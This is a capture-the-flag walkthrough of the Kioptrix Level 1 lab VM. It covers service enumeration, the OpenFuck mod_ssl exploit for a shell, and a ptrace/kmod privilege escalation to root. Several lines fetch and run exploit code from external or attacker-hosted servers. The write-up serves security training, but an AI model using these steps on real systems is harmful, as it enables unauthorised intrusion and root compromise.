---
layout: post
title: Kioptrix Level 1 CTF Walkthrough
date: 2017-07-30
categories:
  - security
  - ctf
  - walkthrough
tags:
  - kioptrix
  - vulnhub
---
## Service Discovery
An Nmap scan [`nmap -sS -sV -T4 -vv 192.168.22.128`] revealed that the machine had a number of services running, most notably an old version of Apache and a Samba service.

```
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
```

Using `nmblookup`, I was able to find the NetBIOS name of the machine:

```shell_session
root@kali:~# nmblookup -A 192.168.22.128
Looking up status of 192.168.22.128
	KIOPTRIX        <00> -         B <ACTIVE>
	KIOPTRIX        <03> -         B <ACTIVE>
	KIOPTRIX        <20> -         B <ACTIVE>
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>
	MYGROUP         <00> - <GROUP> B <ACTIVE>
	MYGROUP         <1d> -         B <ACTIVE>
	MYGROUP         <1e> - <GROUP> B <ACTIVE>

	MAC Address = 00-00-00-00-00-00
```

After identifying the NetBIOS name as `KIOPTRIX`, I used this with `smbclient` to find the available shares and fingerprint the service, which shows the Samba version is `2.2.1a`:

```shell_session
root@kali:~# smbclient -L \\KIOPTRIX -I 192.168.22.128 -N
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]

	Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       IPC Service (Samba Server)
	ADMIN$          IPC       IPC Service (Samba Server)

Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]

	Server               Comment
	---------            -------
	KIOPTRIX             Samba Server

	Workgroup            Master
	---------            -------
	MYGROUP              KIOPTRIX
```

## Exploiting Apache
The version of Apache reported by Nmap is vulnerable to CVE-2002-0082 (a.k.a OpenFuck). I grabbed the exploit from https://www.exploit-db.com/exploits/764/ and installed `libssl-dev`, in order to compile it.

The first attempt to compile resulted in GCC complaining about numerous undeclared constants, due to changes in the library from when the exploit was originally developed.

To solve this, two new include statements needed to be added, so that `openssl/rc4` and `openssl/md5` are both included. After making this small change, the exploit could successfully be compiled by running `gcc exploit.c -o exploit -lcrypto`.

Once the exploit was compiled, I grepped the available offsets that were included in the exploit to find one that matches the fingerprint produced by Nmap earlier:

```shell_session
root@kali:~# ./exploit | grep 1.3.20
	0x02 - Cobalt Sun 6.0 (apache-1.3.20)
	0x27 - FreeBSD (apache-1.3.20)
	0x28 - FreeBSD (apache-1.3.20)
	0x29 - FreeBSD (apache-1.3.20+2.8.4)
	0x2a - FreeBSD (apache-1.3.20_1)
	0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
	0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
	0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
	0x7e - Slackware Linux 8.0 (apache-1.3.20)
	0x86 - SuSE Linux 7.3 (apache-1.3.20)
```

Options `0x6a` and `0x6b` match the fingerprint of the machine, so I tried both. `0x6a` failed, but `0x6b` successfully acquired a shell as the `apache` user:

```shell_session
root@kali:~# ./exploit 0x6b 192.168.22.128 443 -c 50

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 50 of 50
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f81c8
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
oits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; .nl/0304-expl
--16:35:06--  http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to packetstormsecurity.nl:80...
packetstormsecurity.nl: Host not found.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
bash: ./p: No such file or directory
bash-2.05$
bash-2.05$   
```

## Getting Root Shell
As the VM has no access to the Internet, it was unable to automate the privilege escalation. Due to the age of the exploit, it would have failed anyway, as the URL it tries to grab the exploit from is seemingly dead (http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c).

As I was using a non-interactive shell, I grabbed a copy of the ptrace/kmod exploit from https://www.exploit-db.com/exploits/3/. I ran it through GCC locally, to ensure it doesn't need any patching, and found that it was using an old header file [`linux/user.h`], which needed to be replaced with `sys/user.h`.

After making this small change, I started a local HTTP server to transfer it to the target machine:

```shell_session
root@kali:~# python -m SimpleHTTPServer 9090
Serving HTTP on 0.0.0.0 port 9090 ...
```

Once the HTTP server was up, I transferred the updated exploit, compiled and acquired a root shell through it:

```shell_session
bash-2.05$ wget http://192.168.22.129:9090/ptrace.c
bash-2.05$ gcc ptrace.c -o ptrace
bash-2.05$ ./ptrace
[+] Attached to 6289
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
```
